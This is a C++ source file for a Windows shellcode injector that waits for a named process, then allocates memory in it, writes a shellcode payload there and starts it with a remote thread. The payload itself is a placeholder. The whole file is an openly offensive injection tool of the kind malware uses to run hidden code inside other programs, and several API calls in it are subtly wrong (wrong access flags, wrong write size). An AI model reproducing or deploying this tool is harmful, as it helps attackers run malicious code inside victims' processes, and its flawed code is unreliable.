#include "memory/mem.h"
#include <string>
// Big thanks to crows (https://crows-nest.gitbook.io) for making a blog on how to do this :D

int main()
{
	std::string process_name_str;

	unsigned char shellcode[] =
		"\xDE\xAD\xBE\xEF"; // enter your shellcode payload here


	std::cout << "[+] Welcome to ShellcodeInjector by Kinija :D \n";
	std::cout << "------------------------------------------------------- \n";

	std::cout << "[?] Please enter process name \n";
	std::cin >> process_name_str;

	std::wstring process_name_wstr = std::wstring(process_name_str.begin(), process_name_str.end()); // just to wchart_t* convert
	const wchar_t* process_name_wch = process_name_wstr.c_str();

	std::cout << "[~] Getting process id... \n";
	std::cout << "[+] note: if your entered process is not running, its about right time to run it \n";

	DWORD pid = 0;
	while (pid == 0)
	{
		pid = mem::GetProcessId(process_name_wch);
	}

	std::cout << "[+] Sucess! \n";
	std::cout << "[~] Getting process handle.. \n";

	HANDLE proc_handle = OpenProcess(PAGE_EXECUTE_READWRITE, false, pid);
	if (proc_handle == INVALID_HANDLE_VALUE)
	{
		std::cout << "[-] Failed to get handle, exiting...";
		Sleep(10000);
		return 0;
	}

	std::cout << "[+] Sucess! \n";


	std::cout << "[~] Allocating buffer.. \n";

	LPVOID buffer = VirtualAllocEx(proc_handle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE);

	std::cout << "[+] Sucess! \n";
	
	std::cout << "[~] Writing shellcode to process.. \n";

	WriteProcessMemory(proc_handle, buffer, shellcode, sizeof(buffer), nullptr);

	std::cout << "[+] Sucess! \n";
	
	std::cout << "[~] Starting a thread.. \n";
	HANDLE hThread = CreateRemoteThreadEx(proc_handle, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, 0, 0);

	if (hThread == INVALID_HANDLE_VALUE) {
		std::cout << "[-] Failed creating thread, exiting.. \n";
		CloseHandle(proc_handle);
		return 0;
	}
	std::cout << "[+] Sucess.. \n";
	std::cout << "[~] Waiting for thread to end.. \n";
	WaitForSingleObject(hThread, INFINITE);
	std::cout << "[+] Sucess, shellcode has been injected sucessfully! \n";
	std::cout << "------------------------------------------------------- \n";



	return 0;
} 